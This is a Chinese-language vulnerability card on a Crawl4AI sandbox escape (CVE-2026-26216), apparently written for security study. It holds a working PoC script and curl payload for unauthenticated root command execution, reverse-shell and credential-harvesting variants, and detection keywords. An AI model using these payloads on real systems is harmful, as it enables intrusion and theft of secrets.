---
id: binary-pwn-sandbox-escape-crawl4ai-hooks-import-whitelist-rce
title: Crawl4AI < 0.8.0 hooks.code 沙箱逃逸：builtins 白名单保留 __import__ 导致未授权 root RCE（CVE-2026-26216）
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: crawl4ai-hooks-exec-builtins-import-whitelist-escape
tags:
- python
- pyjail
- sandbox-escape
- builtins
- import
- crawl4ai
- fastapi
- rce
- unauth
- docker
cve:
- CVE-2026-26216
severity: critical
confidence: high
status: verified
affected_versions: crawl4ai < 0.8.0（修复版本 0.8.0，GHSA-5882-5rx9-xgxp）
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V138
  verified_at: '2026-11-06T05:39:54+08:00'
  notes: 已对照原文及9张截图核对：ALLOWED_BUILTINS 保留 __import__（第59行）、exec(compile(...), sandbox_globals, sandbox_locals)（第94行）、hooks.code 事件注入、__import__('subprocess').run(shell=True) 回显 uid=0(root)、读 /etc/passwd、0.8.0 移除 __import__/hooks 默认关闭均一致；版本已按原文设置 crawl4ai < 0.8.0。未验证点：原文本地为复刻服务（0.7.4-vuln）而非官方镜像，未对官方 Docker 部署复跑 PoC。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-crawl4ai-hooks-import-whitelist-rce/
draft: false
kb_aliases:
- CVE-2026-26216
- GHSA-5882-5rx9-xgxp
- Crawl4AI hooks
- hooks.code
- ALLOWED_BUILTINS
- __import__ 白名单
- POST /crawl
- 11235
---

## 一句话结论

Crawl4AI < 0.8.0 的 `POST /crawl` 端点接受 `hooks.code` 中的任意 Python 代码，并用 `exec()` 在“手写 builtins 白名单”沙箱里执行；白名单里错误地保留了 `__import__`，因此 `__import__('subprocess').run(..., shell=True)` 即可在未认证、默认 root 的容器内执行任意命令（CVE-2026-26216，CVSS 10.0）。

## 原理

- **入口**：Crawl4AI 官方 Docker 镜像默认把 API 暴露在 `11235` 端口，`POST /crawl` 默认不启用 JWT 认证。请求体中的 `hooks` 结构为 `{"code": {"<event>": "<python code>"}}`，允许调用方为爬虫生命周期事件注入 Python 代码。
- **执行点**：`hook_manager.py` 的 `register_from_code()` 把 `hooks.code` 里的字符串 `exec(compile(code, f"<hook:{event}>", "exec"), sandbox_globals, sandbox_locals)`，其中 `sandbox_globals = {"__builtins__": ALLOWED_BUILTINS}`。代码中必须定义可调用的 `hook` 函数，事件触发时（如 `on_page_context_created`）由框架调用/await。
- **沙箱意图**：`ALLOWED_BUILTINS` 刻意去掉 `open`、`eval`、`exec`、`compile`、`__builtins__`，只保留 `len`、`range`、`str`、`int`、`dict`、`list`、`sorted`、`min`、`max` 和 `Exception`/`ValueError`/`KeyError` 等“看起来无害”的对象。
- **缺陷**：白名单第 59 行保留了 `"__import__": __import__`。`__import__` 是 Python import 语句的底层实现，拿到它就能导入任意标准库模块（`os`、`subprocess`、`socket` 等）；更进一步，`__import__('builtins').__dict__['open']` 可以把作者刻意排除的 `open` 重新取回。一个键同时打穿“模块导入限制”和“危险 builtins 排除”两道防线。
- **为什么成立**：`exec()` 的 `__builtins__` 被替换成字典，但字典里既然包含 `__import__`，用户代码就能通过它加载任意模块并调用其危险能力；手写白名单的信任边界因此完全失效。默认部署又以 root 运行容器，命令执行即容器内 root。
- **修复**：0.8.0 从白名单移除 `__import__`（以及 `eval`/`exec`/`open`/`compile`），hooks 改为默认关闭、需 `CRAWL4AI_HOOKS_ENABLED=true` 才启用，并对 `hooks.code` 做显式类型检查。

## 触发条件

- 目标运行 Crawl4AI < 0.8.0（官方 Docker 镜像或等价部署），`11235` 端口可达。
- `POST /crawl` 可访问；默认部署 JWT 认证关闭（若开启则需要有效 token）。
- 请求体可携带 `hooks.code`，且目标事件在 `SUPPORTED_EVENTS` 中（如 `on_page_context_created`、`on_browser_created`、`before_goto`、`after_goto`、`before_return_html`）。
- 注入代码定义名为 `hook` 的可调用对象；事件触发时执行。

## 利用步骤

1. 访问 `GET /health`，返回 `{"status":"ok","version":"..."}`，确认版本 < 0.8.0。
2. 构造 `POST /crawl` 请求体：`url` 为任意可爬取地址，`hooks.code.on_page_context_created` 为一段定义 `async def hook(page, context, **kwargs)` 的 Python 代码。
3. 在 hook 内用 `__import__('subprocess').run('id', shell=True, capture_output=True, text=True)` 执行命令；也可用 `__import__('os').system(...)`、`__import__('socket')` 反弹 shell。
4. 发送请求；复现服务会把 hook 的 stdout 收集到响应 `server_log` 字段。官方镜像中输出可能只进容器日志，若 HTTP 响应看不到回显，改用反弹 shell、写文件或 DNS/HTTP 带外确认。
5. 验证 `uid=0(root)` 后，读取 `/etc/passwd`、环境变量、数据库连接串、上游 API key、模型凭据等，进一步横向。

## PoC

```python
import json
import urllib.request

TARGET = "http://127.0.0.1:11235/crawl"
CMD = "id; hostname; whoami; uname -a"

hook = f"""
async def hook(page, context, **kwargs):
    sp = __import__('subprocess')
    out = sp.run({CMD!r}, shell=True, capture_output=True, text=True)
    print(out.stdout)
    return page
"""

payload = {
    "url": "http://example.com",
    "hooks": {"code": {"on_page_context_created": hook}},
}

req = urllib.request.Request(
    TARGET,
    data=json.dumps(payload).encode(),
    headers={"Content-Type": "application/json"},
    method="POST",
)
with urllib.request.urlopen(req, timeout=10) as r:
    print(r.read().decode())
```

等价 curl：

```bash
curl -s -X POST http://127.0.0.1:11235/crawl \
  -H "Content-Type: application/json" \
  -d '{"url":"http://example.com","hooks":{"code":{"on_page_context_created":"async def hook(page, context, **kwargs):\n    sp = __import__(\"subprocess\")\n    out = sp.run(\"id\", shell=True, capture_output=True, text=True)\n    print(out.stdout)\n    return page\n"}}}'
```

复现响应示例（复刻服务的 `server_log` 回显）：

```json
{"success":true,"results":[],"registered_hooks":["on_page_context_created"],
 "server_log":"uid=0(root) gid=0(root) groups=0(root)\n..."}
```

读文件变体：把命令换成 `head -3 /etc/passwd`，或用 `__import__('builtins').__dict__['open']('/etc/passwd').read()`。

## 变体与关联

- **事件变体**：任意 `SUPPORTED_EVENTS` 键都可承载代码，不限于 `on_page_context_created`；只要对应事件被触发即可。
- **模块变体**：`__import__('os')`、`__import__('subprocess')`、`__import__('socket')`、`__import__('pty')` 等；无回显时用 `socket` 反弹或 `urllib` 外带。
- **恢复被禁 builtins**：`__import__('builtins').__dict__['open']`、`__import__('builtins').__dict__['eval']` 可取回作者刻意排除的对象。
- **认证变体**：若部署启用了 JWT，则需要有效 token；默认 Docker 部署 JWT 关闭。
- **关联卡片**：[[binary-pwn-sandbox-escape-python-set-builtin-fake-import-globals]]（另一种伪造 `__import__` 的 pyjail 逃逸）、[[binary-pwn-sandbox-escape-fastgpt-inspect-fglobals-original-refs]]（AI 应用沙箱逃逸）、[[web-generic-ssrf-crawl4ai-stream-endpoint-unauth]]（同一产品的 SSRF 入口，可用于资产关联）。

## 检测与防御

- **检测**：`/crawl` 请求中出现 `hooks`/`hooks.code`、`__import__`、`subprocess`、`os.system`、`socket`、`/bin/sh` 等关键字；容器内出现异常子进程（父进程为 uvicorn/python）、异常外连；`/health` 被批量探测 11235 端口。
- **防御**：升级到 crawl4ai >= 0.8.0；无法升级时在反向代理层拦截 `/crawl` 或强制 JWT；设置 `CRAWL4AI_HOOKS_ENABLED` 保持默认关闭；容器以非 root 用户运行（`--user 1000:1000`）；不要把 11235 直接暴露到公网。
- **根本修复**：不要用“手写 builtins 白名单 + exec”作为沙箱；需要执行不可信代码时使用独立进程/容器隔离（seccomp、只读 rootfs、无网络、非 root），或改用真正的语言级隔离方案；白名单中绝不能出现 `__import__`、`eval`、`exec`、`compile`、`open` 等能力。
